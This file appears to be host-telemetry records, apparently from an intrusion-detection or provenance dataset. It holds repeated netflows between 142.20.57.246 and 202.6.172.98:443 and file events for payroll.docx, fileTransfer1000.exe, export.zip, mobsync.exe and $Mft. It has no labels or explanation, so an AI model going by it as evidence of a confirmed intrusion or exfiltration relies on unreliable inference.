d1dbe15e-cf51-4ae4-9974-302aaf520705,{'netflow': '202.6.172.98:443->142.20.57.246:53979'},856728
33c0acd5-2376-4b41-be54-bcdc2ca44a6d,{'file': '/Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx'},78489
78b70f1c-eba8-48de-b236-59c5f77f2483,{'file': '/Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx:Zone.Identifier'},78490
41b4cbde-8c98-4364-8c66-1ae158d138a3,{'netflow': '142.20.57.246:49999->202.6.172.98:443'},809628
6d0f2c77-c399-4600-80f6-56f1bb83f69a,{'netflow': '202.6.172.98:443->142.20.57.246:53451'},836253
20937182-9c5a-4c71-9312-2d03dab067a0,{'netflow': '202.6.172.98:443->142.20.57.246:50073'},811677
12596df0-f32e-4a89-8c77-20f6c1c7c097,{'netflow': '142.20.57.246:53996->202.6.172.98:443'},858783
c3c63537-708b-4711-aaa5-afbf1a501e25,{'netflow': '142.20.57.246:49973->202.6.172.98:443'},805536
2df87ee1-4322-4b7e-ba3a-2b92b6f0bcb8,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier'},96925
4757c1e8-bf20-4734-9b42-326e9ef0fbcf,{'netflow': '142.20.57.246:53982->202.6.172.98:443'},856744
71e62b27-529e-4dcd-be3e-abc85f451dd0,{'netflow': '202.6.172.98:443->142.20.57.246:53982'},856748
107172a2-ac1d-4b01-a4ad-13dd69ac123c,{'netflow': '142.20.57.246:53255->202.6.172.98:443'},821935
60a41da4-4fcd-4230-8bda-d3108cbabaf5,{'netflow': '142.20.57.246:53347->202.6.172.98:443'},828082
88f4b660-2afa-4dc9-97a6-68be8a783990,{'netflow': '202.6.172.98:443->142.20.57.246:53504'},842419
80c28690-8f9f-4d9b-a88c-3671f37e2652,{'netflow': '142.20.57.246:53957->202.6.172.98:443'},854714
f4ff4134-190b-43de-a132-248d9e5483d0,{'netflow': '202.6.172.98:443->142.20.57.246:53255'},821953
9a890884-072d-4cf2-8f84-e9ef65a7fee5,{'netflow': '142.20.57.246:53878->202.6.172.98:443'},844483
ad868f6a-9295-4b7f-864d-3b22d0c1a2aa,{'netflow': '202.6.172.98:443->142.20.57.246:53380'},830147
31004f99-9c13-46a9-a5c1-19a2eb08c4e0,{'netflow': '202.6.172.98:443->142.20.57.246:53435'},834244
6e815e7d-3689-4166-bb22-9238ecf1a5ea,{'netflow': '142.20.57.246:49987->202.6.172.98:443'},807622
dfa7edb2-b066-4d24-801f-aae338c81452,{'netflow': '142.20.57.246:54013->202.6.172.98:443'},860870
77d2979a-491c-4413-a48b-239b40a08c5c,{'netflow': '142.20.57.246:53452->202.6.172.98:443'},836299
d097596c-958e-4c96-b1bb-ad363bf3da79,{'netflow': '202.6.172.98:443->142.20.57.246:49973'},805579
1a2d3f67-5836-4e11-9a9b-e1a3e20deb69,{'netflow': '202.6.172.98:443->142.20.57.246:53996'},858827
778e96cc-f225-4c96-a1e5-cbf439b8460f,{'netflow': '202.6.172.98:443->142.20.57.246:53452'},836301
28bf45ae-90e7-4795-ba94-4d75fa0ab0ba,{'netflow': '202.6.172.98:443->142.20.57.246:53957'},854736
fcb7c1e7-da89-412f-9d70-558a86c82327,{'netflow': '142.20.57.246:53919->202.6.172.98:443'},848593
167c9367-4648-4278-bb0f-f7050135c6e4,{'netflow': '202.6.172.98:443->142.20.57.246:49987'},807634
2060eefa-d686-4996-be94-52120a9e80ae,{'netflow': '142.20.57.246:53940->202.6.172.98:443'},852691
4639e1f8-a22e-4ef5-9cf0-c861c221bf52,{'netflow': '202.6.172.98:443->142.20.57.246:50074'},811739
b14f83cc-a16f-46ed-8d19-edca27d8d8cc,{'netflow': '202.6.172.98:443->142.20.57.246:53878'},844508
36181957-6f8d-499d-985c-164a949221ad,{'netflow': '202.6.172.98:443->142.20.57.246:53325'},826080
69202a35-9d6b-448b-8ee0-404921514e68,{'netflow': '202.6.172.98:443->142.20.57.246:49999'},809699
41d95e1a-8611-4460-833c-f4dd4d714477,{'netflow': '142.20.57.246:53326->202.6.172.98:443'},826091
2d09a5d6-cb07-45a6-9c33-04283cabd2ad,{'netflow': '142.20.57.246:53348->202.6.172.98:443'},828142
173cd931-27fc-42e2-af5c-ad079c505507,{'netflow': '142.20.57.246:53349->202.6.172.98:443'},828145
633865c9-e83b-4c9b-bc68-17929d82350f,{'netflow': '202.6.172.98:443->142.20.57.246:53899'},846580
698e076b-0071-4517-9a34-ddf463930aab,{'netflow': '142.20.57.246:53350->202.6.172.98:443'},828148
e9f991cb-d494-4fc1-a1f2-22e490abbc21,{'netflow': '142.20.57.246:53928->202.6.172.98:443'},850676
e673ba05-fc8d-47eb-820b-29a1f7861ecd,{'netflow': '142.20.57.246:49974->202.6.172.98:443'},805623
b7a40264-69ce-471e-abbf-4e53c719ad2d,{'netflow': '142.20.57.246:53411->202.6.172.98:443'},832249
84b0644f-e439-4731-94b9-24330fa8efce,{'netflow': '142.20.57.246:53351->202.6.172.98:443'},828153
b43f58d4-d5e2-43a7-9128-ec9f0f27b0cb,{'netflow': '202.6.172.98:443->142.20.57.246:53348'},828155
75360373-e90e-4a01-ad71-d1fe16cefd3e,{'netflow': '202.6.172.98:443->142.20.57.246:53349'},828156
638b7a35-d40c-487c-97ac-2ebf0cde167a,{'netflow': '202.6.172.98:443->142.20.57.246:53347'},828154
dfa358ac-ec3d-41de-b347-33470a75ae76,{'netflow': '202.6.172.98:443->142.20.57.246:53351'},828157
8c183d10-c697-42d0-b611-68ec50edebcc,{'netflow': '142.20.57.246:53300->202.6.172.98:443'},824062
fe968c2a-6f07-43c2-a66c-60dc3e44d1e1,{'netflow': '202.6.172.98:443->142.20.57.246:53350'},828158
4b35a7df-c1da-4d5b-8ab5-35f8d33f7148,{'netflow': '202.6.172.98:443->142.20.57.246:53411'},832263
07de5429-e30c-4dbb-80d1-4b73061f3079,{'netflow': '142.20.57.246:49988->202.6.172.98:443'},807687
441d741b-e570-4f1b-b363-d71341ba3013,{'netflow': '202.6.172.98:443->142.20.57.246:49988'},807694
1d982698-ecde-45c0-9e8d-d1bed7299b05,{'netflow': '202.6.172.98:443->142.20.57.246:53326'},826128
fe618e2b-4bfa-4669-b0c7-837a9a2d9b44,{'netflow': '142.20.57.246:53489->202.6.172.98:443'},840483
88ba71c7-21d5-4059-a151-6b21db71d5d2,{'netflow': '202.6.172.98:443->142.20.57.246:53940'},852773
fb91233a-c32e-4085-9fdc-121f8bc90dff,{'netflow': '142.20.57.246:53473->202.6.172.98:443'},838441
591b6f39-6758-4044-9cb7-60bb9cd7069f,{'netflow': '142.20.57.246:53983->202.6.172.98:443'},856873
a0233740-abfa-409f-8f78-67c7e901efc5,{'netflow': '202.6.172.98:443->142.20.57.246:53928'},850731
d1dfe545-3672-4135-97f6-73bf5be7db54,{'netflow': '142.20.57.246:53414->202.6.172.98:443'},832301
ddb7513a-05b7-46e7-99a1-cfa84319f955,{'netflow': '142.20.57.246:53415->202.6.172.98:443'},832302
c06a6026-ae3c-4257-96e0-7d7a02601d82,{'netflow': '202.6.172.98:443->142.20.57.246:53415'},832303
42f668c8-a90c-4bae-adc7-90a961ac3303,{'netflow': '202.6.172.98:443->142.20.57.246:53473'},838448
25c3845d-2841-4297-bd4d-cf4bece15cfb,{'netflow': '202.6.172.98:443->142.20.57.246:53414'},832304
82e1a9a3-d9f9-4570-b783-20ec83ed9a88,{'netflow': '202.6.172.98:443->142.20.57.246:53983'},856880
81ff6ceb-dde2-4d60-b64d-14f2c8a7d941,{'netflow': '142.20.57.246:53416->202.6.172.98:443'},832307
397b3053-0cbb-4dd4-a1ea-0240380caf8d,{'netflow': '202.6.172.98:443->142.20.57.246:53416'},832308
907cd9f2-58f1-4b1a-acf1-c1a8836fe0e7,{'netflow': '202.6.172.98:443->142.20.57.246:53489'},840508
b5605e0a-1d50-45d3-b475-f950d3ddf379,{'netflow': '142.20.57.246:53453->202.6.172.98:443'},836412
11d5036f-2bb0-4569-a192-777d5cbea4a3,{'netflow': '202.6.172.98:443->142.20.57.246:49974'},805696
2420063e-9d71-4870-a837-4926951c2503,{'netflow': '142.20.57.246:53327->202.6.172.98:443'},826176
c2cac44f-c4f5-495e-b14a-3f03e0bfd6f3,{'netflow': '202.6.172.98:443->142.20.57.246:53327'},826180
cf379169-871f-4802-9d21-129caf9b6dde,{'netflow': '202.6.172.98:443->142.20.57.246:53300'},824137
d51fe4c7-116c-4c60-90ef-30d0fa53917e,{'netflow': '142.20.57.246:53265->202.6.172.98:443'},822090
fc8f75ee-1c46-4d65-80ac-091561ec4e97,{'netflow': '142.20.57.246:53381->202.6.172.98:443'},830282
36932a18-9a9f-4fd0-88f5-3ac50a2ca452,{'netflow': '142.20.57.246:53958->202.6.172.98:443'},854860
2694eb33-5b69-4842-b24b-3cbf334fda52,{'netflow': '202.6.172.98:443->142.20.57.246:53381'},830283
579cdad6-c2d0-4b43-985a-a0d58b94c84b,{'netflow': '202.6.172.98:443->142.20.57.246:53958'},854863
3194a099-f42a-4b23-a91f-5f49de6cf87d,{'netflow': '142.20.57.246:53929->202.6.172.98:443'},850770
87394457-ecc6-4379-936b-af8e5a93a5af,{'netflow': '142.20.57.246:53266->202.6.172.98:443'},822100
3d94121e-42b3-44d7-852d-64b841f14258,{'netflow': '142.20.57.246:49989->202.6.172.98:443'},807765
d5d78a41-8f36-4660-a1c2-b867ab6e38d6,{'netflow': '202.6.172.98:443->142.20.57.246:53919'},848732
556d5da7-a1b4-4390-a048-7f1821bc15bf,{'netflow': '202.6.172.98:443->142.20.57.246:54013'},861023
2bce81fa-d6e6-43d8-8eec-c097174a3c31,{'netflow': '202.6.172.98:443->142.20.57.246:53417'},832357
85b11eb8-2282-4a32-8565-2f0870bc5e5b,{'netflow': '142.20.57.246:53417->202.6.172.98:443'},832358
789f4700-84ab-40dc-ad3c-52c4bd1e273f,{'netflow': '142.20.57.246:53125->202.6.172.98:443'},820069
af83551e-c281-453b-9031-05507662b45c,{'netflow': '202.6.172.98:443->142.20.57.246:53929'},850791
f0e56258-2bf9-4ed6-8bd7-13311a303279,{'netflow': '202.6.172.98:443->142.20.57.246:49989'},807782
a7c0183d-82cc-47d6-baa3-3cb9dc2c1636,{'netflow': '142.20.57.246:53516->202.6.172.98:443'},842602
f4e74e2d-6ab7-4d95-b170-ef04e010e958,{'netflow': '142.20.57.246:50000->202.6.172.98:443'},809837
16092168-fd4d-4890-91fa-b5df3dbd76b7,{'netflow': '142.20.57.246:53328->202.6.172.98:443'},826229
73b8427a-e266-4a66-882e-f96cc37a73c1,{'netflow': '202.6.172.98:443->142.20.57.246:53328'},826230
a8e874cd-167e-48a1-a69b-ca8b6ea88f79,{'netflow': '202.6.172.98:443->142.20.57.246:53516'},842618
bd3bb37f-1663-4a32-812d-5d272ccb2e43,{'file': '/Device/HarddiskVolume1/Windows/System32/mobsync.exe'},93051
e72e0e48-3e50-47a0-8046-fa04119ae83b,{'netflow': '142.20.57.246:53329->202.6.172.98:443'},826257
8b9fdd0e-afed-4c0c-aa1d-fc66d1e0d81f,{'netflow': '202.6.172.98:443->142.20.57.246:53329'},826260
38fa143c-9a24-4fbb-80ea-37304ebfbbbf,{'netflow': '142.20.57.246:53330->202.6.172.98:443'},826263
36909421-9ede-4afa-bed2-c4ee8785e64c,{'netflow': '142.20.57.246:53984->202.6.172.98:443'},856985
53430685-4307-4e18-8a4c-e8bb97ed4473,{'netflow': '202.6.172.98:443->142.20.57.246:53330'},826266
a4696064-3ca0-489e-89de-a188df2897ed,{'netflow': '142.20.57.246:53900->202.6.172.98:443'},846747
6c051141-d8cf-43a3-bce3-4ef7259bc38c,{'netflow': '202.6.172.98:443->142.20.57.246:53984'},856988
14d36b6e-892c-4f6c-b7a6-b2edb9fae965,{'netflow': '142.20.57.246:54014->202.6.172.98:443'},861084
34e22fb4-d0a4-47cf-8396-4567fa82a3f9,{'netflow': '142.20.57.246:50119->202.6.172.98:443'},811940
970821cf-2007-4f70-a570-ac401226ec04,{'netflow': '202.6.172.98:443->142.20.57.246:53265'},822182
10ee6544-662b-4033-a4fa-aac0cc05bebb,{'netflow': '202.6.172.98:443->142.20.57.246:53266'},822183
5c83a6d1-02c0-425c-8a56-20e268ef7b2f,{'netflow': '142.20.57.246:53985->202.6.172.98:443'},857000
4eae78c1-b2dd-4036-9a56-c7f00694af12,{'netflow': '202.6.172.98:443->142.20.57.246:50000'},809899
ce27bcce-0907-4180-b3ea-7cb26cc1c7e2,{'netflow': '202.6.172.98:443->142.20.57.246:50119'},811949
e471da7d-1483-4cc3-a952-3c1a7d3e9e04,{'netflow': '142.20.57.246:53382->202.6.172.98:443'},830381
e8dace7b-b40f-4ad1-bba4-f4bfa4b409b7,{'netflow': '202.6.172.98:443->142.20.57.246:53985'},857007
34af485b-5b91-4d48-ab78-b9662843ebec,{'netflow': '202.6.172.98:443->142.20.57.246:53900'},846778
bd293587-25f7-4c2f-ae84-23ea97e6abe6,{'netflow': '142.20.57.246:53901->202.6.172.98:443'},846782
0f381597-e519-405f-8dfb-1d5e551723e3,{'netflow': '142.20.57.246:53474->202.6.172.98:443'},838593
0ebcd93f-d8c8-4e74-b715-b6348fffbbd2,{'netflow': '142.20.57.246:53331->202.6.172.98:443'},826306
413bf0e5-39b0-4e9d-80d4-c947b3bce75f,{'netflow': '202.6.172.98:443->142.20.57.246:54014'},861125
2428a146-3385-4d65-85e0-799f945c6536,{'netflow': '142.20.57.246:53436->202.6.172.98:443'},834509
c47ed531-9cc9-46db-937f-57832e72c629,{'netflow': '142.20.57.246:53419->202.6.172.98:443'},832462
cbf90b75-d08d-4ecc-ae26-fa84e72595ef,{'netflow': '142.20.57.246:53352->202.6.172.98:443'},828367
d08b8da7-c8ba-4e51-8e61-0094dfe17c85,{'netflow': '142.20.57.246:53418->202.6.172.98:443'},832461
b9ebc1ba-001e-4b68-90da-325549a1b227,{'netflow': '202.6.172.98:443->142.20.57.246:53436'},834514
c1a7d19c-9667-4ad3-a938-e31558b3baf3,{'netflow': '202.6.172.98:443->142.20.57.246:53419'},832467
d8a4e5c9-9906-41ab-b803-6765025c626f,{'netflow': '202.6.172.98:443->142.20.57.246:53418'},832468
6fcdffb3-46d0-4946-a1ba-42ea5f970070,{'netflow': '202.6.172.98:443->142.20.57.246:53474'},838614
7aa2163d-5d23-4619-abbb-f8f5fe39253c,{'netflow': '142.20.57.246:50120->202.6.172.98:443'},811998
9fa53b0a-fed3-4179-a15e-72a364b5e80f,{'netflow': '142.20.57.246:53997->202.6.172.98:443'},859102
7ada625c-aa0c-461b-a79c-0902a253fc77,{'netflow': '202.6.172.98:443->142.20.57.246:53382'},830432
6d09175b-20b1-49d7-a134-c01d10304da4,{'netflow': '202.6.172.98:443->142.20.57.246:50120'},812003
6a40fa62-a5b2-4c14-8227-06d69b7ac5fa,{'netflow': '142.20.57.246:49975->202.6.172.98:443'},805861
a2a79f25-ba45-4303-b291-b48a6319e6a8,{'netflow': '142.20.57.246:49990->202.6.172.98:443'},807915
b280b145-ff2e-4ff5-82b8-a0d983f2bbad,{'netflow': '202.6.172.98:443->142.20.57.246:53352'},828395
38a77017-0f6b-419d-8940-bd1fba967fb0,{'netflow': '142.20.57.246:53353->202.6.172.98:443'},828396
d29fa14c-d10f-4a76-858c-1ff01a2ce7b0,{'netflow': '142.20.57.246:53931->202.6.172.98:443'},850926
fb48b18b-30bd-44fc-bd18-153de314cc3b,{'netflow': '202.6.172.98:443->142.20.57.246:53901'},846831
2443360e-9f7f-425e-8136-bbf1911361bc,{'netflow': '142.20.57.246:53354->202.6.172.98:443'},828401
8e9787d0-5991-48df-888d-9914a56ca8a8,{'netflow': '202.6.172.98:443->142.20.57.246:53997'},859125
22a94f2b-c4e2-49fa-be57-b886bfcd4e30,{'netflow': '142.20.57.246:53490->202.6.172.98:443'},840695
3ebe43cf-a750-4bad-b013-2ea7e0589d52,{'netflow': '142.20.57.246:53902->202.6.172.98:443'},846842
b319cdb0-b1eb-4e35-8edd-465518cd8701,{'netflow': '142.20.57.246:53941->202.6.172.98:443'},852999
4de14474-aca1-49cd-afe6-9e7eed4fd2b8,{'netflow': '142.20.57.246:49928->202.6.172.98:443'},803849
02280134-6e0d-4bec-85fb-3b5898832c56,{'file': '/Device/HarddiskVolume1/Users/sysadmin/AppData/Roaming/Microsoft/Windows/Recent/export.zip.lnk'},95241
cce2d043-87c3-40b2-b8fa-aa6cd2582f78,{'netflow': '202.6.172.98:443->142.20.57.246:53331'},826379
a61dddde-1a0b-40af-8380-b8d1d75ac87a,{'netflow': '142.20.57.246:49931->202.6.172.98:443'},803852
e9cfac86-4af8-46c9-bdd5-8101b82b4764,{'netflow': '202.6.172.98:443->142.20.57.246:49928'},803853
ea1a5eec-101c-48bf-a39b-c256a1e98ca1,{'netflow': '142.20.57.246:53268->202.6.172.98:443'},822286
6b07e395-e37a-460f-bd69-a0f9afff1db3,{'netflow': '142.20.57.246:53879->202.6.172.98:443'},844815
ca4fd528-dad6-44e4-8bad-2c22b85ef57d,{'netflow': '202.6.172.98:443->142.20.57.246:53931'},850956
6dc43a70-a651-490d-8f57-7a74d36be7e2,{'netflow': '142.20.57.246:53274->202.6.172.98:443'},822289
788c0fc3-ed2f-401e-89cd-f2d566999d02,{'netflow': '142.20.57.246:49930->202.6.172.98:443'},803851
b5356524-ea08-42b3-b6aa-d478c1430e54,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/export.zip'},95249
30a43f59-987b-454f-93d6-255bcb839971,{'netflow': '202.6.172.98:443->142.20.57.246:53353'},828438
b615f21a-02dd-4b40-a132-4d4050ea3ae5,{'netflow': '202.6.172.98:443->142.20.57.246:53354'},828439
0ea8251d-df59-4065-b727-ac77e12bf5e7,{'netflow': '202.6.172.98:443->142.20.57.246:53274'},822301
5d1eab68-ad8c-4de2-aaed-56fcc6f1067a,{'netflow': '202.6.172.98:443->142.20.57.246:53125'},820253
9eb9cfea-b438-4357-b39e-95c769a0123f,{'netflow': '202.6.172.98:443->142.20.57.246:49975'},805919
5f68f526-e50a-4137-8690-e1538396dbb6,{'netflow': '202.6.172.98:443->142.20.57.246:53268'},822303
5bfce52b-6daa-4db4-a0a8-5ace73f580d8,{'netflow': '202.6.172.98:443->142.20.57.246:49990'},807974
e1be8736-6a16-4521-bff9-37e7f3bf62eb,{'netflow': '142.20.57.246:54044->202.6.172.98:443'},861223
a0e57aef-e38e-4205-81dd-a5774c102dab,{'netflow': '202.6.172.98:443->142.20.57.246:53453'},836649
2db5f108-6e85-407f-85e9-04322453efc4,{'netflow': '142.20.57.246:53932->202.6.172.98:443'},850993
9d5bad45-33a1-4b28-ae76-996cd4a3457c,{'netflow': '202.6.172.98:443->142.20.57.246:54044'},861233
dbd1e52b-642e-4770-81e2-6de130d982d2,{'netflow': '142.20.57.246:53986->202.6.172.98:443'},857146
9174a973-f2ab-4305-abb9-200f17c2b3ac,{'netflow': '142.20.57.246:53332->202.6.172.98:443'},826429
0dd14893-1f78-4234-8573-fa0838e48080,{'netflow': '202.6.172.98:443->142.20.57.246:53879'},844864
cb92464e-4744-49a3-9bd0-afae81e48a82,{'netflow': '202.6.172.98:443->142.20.57.246:49930'},803905
274b28fa-eb2c-4152-92dd-90134eec9659,{'netflow': '142.20.57.246:53959->202.6.172.98:443'},855105
db2c57aa-c1ec-4da6-8545-4005ca3e9442,{'netflow': '202.6.172.98:443->142.20.57.246:49931'},803906
465c2d23-a3a8-4a51-a2a5-0ac60bacf082,{'netflow': '202.6.172.98:443->142.20.57.246:53490'},840776
045662a5-5ed3-4e94-a499-39ecde8d54d4,{'netflow': '142.20.57.246:53301->202.6.172.98:443'},824392
15c46df0-311b-4119-be3e-733bccb5b346,{'netflow': '202.6.172.98:443->142.20.57.246:53941'},853071
61e64839-55f4-45ff-8499-776ffdd1d4a0,{'netflow': '142.20.57.246:53355->202.6.172.98:443'},828496
a9dbf887-91b4-4569-9d04-db6bb19fe64f,{'netflow': '142.20.57.246:54045->202.6.172.98:443'},861266
c81c90c5-c1f1-455a-ab62-4ea7a3086352,{'netflow': '202.6.172.98:443->142.20.57.246:53332'},826452
773167ee-1e1a-4abf-92cf-ff70dafc3fd6,{'netflow': '142.20.57.246:53920->202.6.172.98:443'},848981
fdddcf1d-dbb3-4d2c-bc34-d4a3e3e6fe98,{'netflow': '202.6.172.98:443->142.20.57.246:54045'},861274
2d78fbcb-564d-4b65-a137-7b14a8d3852f,{'netflow': '202.6.172.98:443->142.20.57.246:53932'},851042
85505a84-b174-40ce-a515-8168eaa04c08,{'netflow': '202.6.172.98:443->142.20.57.246:53959'},855140
e02ac80f-48d8-4abc-9580-cc5246563b20,{'netflow': '202.6.172.98:443->142.20.57.246:53986'},857189
224c581a-e92f-45a3-852e-811386beab40,{'netflow': '142.20.57.246:53420->202.6.172.98:443'},832619
84ececd6-778d-446c-964f-d5212b798b37,{'netflow': '202.6.172.98:443->142.20.57.246:53902'},846956
9f565ec9-8583-40f8-af60-ec943b11570b,{'netflow': '142.20.57.246:53437->202.6.172.98:443'},834677
96f4e6f7-5cac-4b09-afa6-204ed7d6080e,{'netflow': '142.20.57.246:50001->202.6.172.98:443'},810105
47f7089a-b2bb-42a3-ac29-5b7c5724cc63,{'netflow': '142.20.57.246:53356->202.6.172.98:443'},828538
554aa7a8-df50-49a2-a0c2-c340d21b2101,{'netflow': '202.6.172.98:443->142.20.57.246:53355'},828539
b9e1af37-4b5e-4e6b-9831-21063fe80c04,{'netflow': '142.20.57.246:53275->202.6.172.98:443'},822394
d803d843-d205-49f8-922d-cd86cfc980ca,{'netflow': '142.20.57.246:53357->202.6.172.98:443'},828542
ebbe13f1-9b50-4f70-b39e-185ebe35f0cd,{'netflow': '202.6.172.98:443->142.20.57.246:53420'},832642
115edfb8-fffb-4f4b-b707-58cebdb8667b,{'netflow': '202.6.172.98:443->142.20.57.246:53356'},828550
36071af7-d7a5-415d-a693-1d5b21042e42,{'netflow': '202.6.172.98:443->142.20.57.246:53357'},828551
fe250e3b-54ee-4504-b205-45310e6aec3c,{'netflow': '142.20.57.246:53998->202.6.172.98:443'},859278
3ea6a98d-1ca0-4224-939d-f0b8c8647c01,{'netflow': '142.20.57.246:52442->202.6.172.98:443'},818319
161b147f-c705-45bc-be28-8ee039dd8323,{'netflow': '202.6.172.98:443->142.20.57.246:53437'},834704
75ffbb1a-fd85-43dd-91f1-0907799880f5,{'netflow': '142.20.57.246:53333->202.6.172.98:443'},826517
9b2fe93a-5293-4867-bd5e-2cd091ecbb1e,{'netflow': '142.20.57.246:53475->202.6.172.98:443'},838806
9e157c8a-646b-465e-9f07-772ef996e298,{'netflow': '202.6.172.98:443->142.20.57.246:53475'},838809
7c6316d2-6c85-4de2-aacc-11ddcd566162,{'netflow': '202.6.172.98:443->142.20.57.246:53333'},826522
d27794d7-d187-45d4-a4d0-483f5d11f339,{'netflow': '142.20.57.246:53334->202.6.172.98:443'},826523
a90ec53e-b0ce-4903-892e-84f1214a6bba,{'netflow': '202.6.172.98:443->142.20.57.246:50001'},810148
549816d7-dcf5-4a0e-96ca-4b11b5f9b495,{'netflow': '202.6.172.98:443->142.20.57.246:53334'},826538
f112e323-e8b4-4091-8ea5-00498b71c639,{'netflow': '142.20.57.246:49938->202.6.172.98:443'},804014
3b4dcd21-3b08-451e-bd8a-2d502ddacbf4,{'netflow': '202.6.172.98:443->142.20.57.246:53275'},822449
920107cc-72c2-479b-ab51-4b03236079fe,{'file': '/Device/HarddiskVolume1/Windows/system32/mobsync.exe'},89266
eeac89d7-2ece-4102-b479-a2f3703db845,{'netflow': '142.20.57.246:53383->202.6.172.98:443'},830652
32044c18-0bfb-47b3-b768-2f3e82cd40bc,{'netflow': '142.20.57.246:53277->202.6.172.98:443'},822463
5c1c7de6-9c31-4f77-870a-ff01c74edf25,{'netflow': '142.20.57.246:53880->202.6.172.98:443'},844997
e8e37840-e844-4783-b3df-b2852d54ef2e,{'netflow': '202.6.172.98:443->142.20.57.246:53277'},822471
e820f27b-9919-43c9-bb98-44cf096d88cb,{'netflow': '202.6.172.98:443->142.20.57.246:53998'},859338
1297f87b-6f7a-4714-872f-c55eb4e073b6,{'netflow': '142.20.57.246:53454->202.6.172.98:443'},836811
f66845a7-01be-427e-81b1-c37ae90ab1ea,{'netflow': '142.20.57.246:53335->202.6.172.98:443'},826573
ebc7869c-3328-4e44-b309-62c9216306bf,{'netflow': '202.6.172.98:443->142.20.57.246:52442'},818383
982dabbc-b53a-417a-bafd-2669f3afb36f,{'netflow': '142.20.57.246:49976->202.6.172.98:443'},806096
979259fb-2b50-480c-b4e1-fe36a4d5aaa8,{'netflow': '142.20.57.246:49991->202.6.172.98:443'},808145
9873c7ad-f22f-4016-8e82-ec45bf746479,{'netflow': '142.20.57.246:53960->202.6.172.98:443'},855255
f19db3ba-57ed-4f6f-80bc-30e3793934fc,{'netflow': '202.6.172.98:443->142.20.57.246:53301'},824537
e2671244-0818-4427-b052-10530ba40edb,{'file': '/Device/HarddiskVolume1/Windows/SysWOW64/kernelbase.dll'},87266
3eb1e8cb-cabd-4519-9a4c-dd5487730768,{'netflow': '202.6.172.98:443->142.20.57.246:53335'},826597
0348ac37-4e30-4a11-8305-e2c0dc0cdd04,{'netflow': '142.20.57.246:53942->202.6.172.98:443'},853224
a8ca3a16-4111-473d-abea-a259319e4dad,{'netflow': '142.20.57.246:53903->202.6.172.98:443'},847081
6cfa683c-cb55-4122-9f02-58817039e967,{'netflow': '202.6.172.98:443->142.20.57.246:53903'},847082
14e87cdf-8a7b-434f-8149-9263e3d31ce3,{'netflow': '142.20.57.246:53476->202.6.172.98:443'},838891
ee881a33-b540-4a92-9ce6-8134bfa1daf7,{'netflow': '202.6.172.98:443->142.20.57.246:53383'},830701
82358590-ca24-4f6b-92f8-36d337ef717b,{'netflow': '142.20.57.246:53336->202.6.172.98:443'},826613
c555d2d4-5199-4ead-a6a4-37813824e0e2,{'netflow': '142.20.57.246:53421->202.6.172.98:443'},832759
40170594-d5c1-44cd-a221-f3e2f4da7934,{'netflow': '202.6.172.98:443->142.20.57.246:53454'},836856
121158cb-6a0d-4a6c-a160-e6f25720a0cd,{'netflow': '202.6.172.98:443->142.20.57.246:50122'},812281
0627360b-d315-4bd2-980a-32eff4f17d92,{'netflow': '202.6.172.98:443->142.20.57.246:49991'},808186
5d150e37-54ed-43ef-819c-ab1d0e8f82ae,{'netflow': '142.20.57.246:50122->202.6.172.98:443'},812280
765d89a5-0170-4ebb-a80a-d7fdcb86facc,{'netflow': '202.6.172.98:443->142.20.57.246:49976'},806144
e11fa54a-41be-430f-abf1-bd3a29228eac,{'netflow': '142.20.57.246:53987->202.6.172.98:443'},857352
4932606a-c6d5-48c2-b2cf-9774b3c51aa1,{'netflow': '202.6.172.98:443->142.20.57.246:53920'},849160
f83615e0-0015-4657-8e90-87ea971598e7,{'file': '/Device/HarddiskVolume1/$Mft'},70927
4798594c-b31f-4841-9ae4-7a4911fb2023,{'netflow': '142.20.57.246:53933->202.6.172.98:443'},851216
22efa912-f64d-4bc8-a2b0-367b1faa8f9d,{'netflow': '142.20.57.246:50002->202.6.172.98:443'},810257
626d66bb-b5c8-4653-a47c-43e193903a55,{'netflow': '142.20.57.246:50003->202.6.172.98:443'},810258
4a433ec7-38b9-4af1-b495-56c37b8c777c,{'netflow': '142.20.57.246:53438->202.6.172.98:443'},834835
81683cf0-9d51-441d-a265-7d780046f679,{'netflow': '202.6.172.98:443->142.20.57.246:53438'},834836
fd905aab-f583-417f-9000-488ec949b4bd,{'netflow': '202.6.172.98:443->142.20.57.246:53942'},853273
14313a9f-bf8c-4f6d-848a-ef681da19618,{'netflow': '202.6.172.98:443->142.20.57.246:50002'},810267
9ef6fabe-093f-4db7-825a-f12f3563bb92,{'netflow': '202.6.172.98:443->142.20.57.246:50003'},810268
3282ddb8-ab1f-4dcd-b632-5ca73ed3134a,{'netflow': '202.6.172.98:443->142.20.57.246:53987'},857375
490df64b-fa98-47c4-ba99-52eb37e9de5a,{'netflow': '202.6.172.98:443->142.20.57.246:53880'},845090
88f11352-9c33-4cc0-813a-89404c7294ea,{'netflow': '202.6.172.98:443->142.20.57.246:53476'},838946
17b9048d-60d5-4c9b-b455-0f8e8a6d9d8d,{'netflow': '202.6.172.98:443->142.20.57.246:53336'},826661
7602e8af-04f4-4814-9c95-2a7496df2d4d,{'netflow': '202.6.172.98:443->142.20.57.246:53421'},832810
e4cb794a-afb6-4793-8f62-c5952fbabf1d,{'netflow': '142.20.57.246:53904->202.6.172.98:443'},847149
0681930d-9173-4659-9edb-d5ecc92d28b5,{'netflow': '142.20.57.246:50123->202.6.172.98:443'},812336
9aff27c3-7c11-4993-ab55-fdace2edfd76,{'netflow': '142.20.57.246:50124->202.6.172.98:443'},812337
494a86f6-e177-4fac-afd4-15b49ea00746,{'netflow': '202.6.172.98:443->142.20.57.246:50123'},812338
0f70c1bb-dca1-4e21-ab01-42b0de1bfaec,{'netflow': '202.6.172.98:443->142.20.57.246:50124'},812339
1292c5fa-71bf-4848-9d57-e931f48add02,{'netflow': '202.6.172.98:443->142.20.57.246:53960'},855350
ecdf2ca0-5411-4411-b6fa-edc791716cca,{'netflow': '142.20.57.246:54062->202.6.172.98:443'},861497
0a91e093-8993-4465-86ee-68874f432548,{'netflow': '142.20.57.246:53358->202.6.172.98:443'},828736
b33268af-5e0d-40bf-8cf7-0c3d72d5b921,{'netflow': '202.6.172.98:443->142.20.57.246:54062'},861507
62609615-64bf-442b-b54d-561d40322028,{'netflow': '202.6.172.98:443->142.20.57.246:53933'},851272
